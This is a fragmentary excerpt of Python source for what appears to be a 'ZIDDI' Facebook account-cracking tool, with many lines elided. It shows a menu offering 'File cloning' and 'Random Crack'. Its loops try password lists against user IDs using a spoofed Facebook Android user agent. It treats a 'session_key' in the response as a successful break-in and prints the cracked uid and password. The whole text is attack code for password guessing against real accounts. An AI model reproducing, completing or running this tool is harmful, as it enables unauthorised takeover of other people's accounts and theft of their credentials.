...
def cloning_two():
    ...
    print(logo)
  #  print(50*'-')
    print(f" \033[32m[1] System Password")
    ...
    if clon_ == "1":
        ...
        #print("\n")
        if lp.isnumeric():
            #print(" {P}Example : [ firstlast first last first123 ] \")
  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [ZIDDI-OK] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-KING] {} {} {} {}'.format(G, url, fax, px, mys))
                ...
                #print(response.text)
                continue
        sys.stdout.write('\r {} [ZIDDI] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def menu(): 
			os.system('clear');print(logo);print(' [1] File cloning\n [2] Create ids file \033[31m{not warking }\033[36m \033[1m \n [3] Random Crack\n [0] Exit menu')
			l1()
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ ZIDDI ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZIDDI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
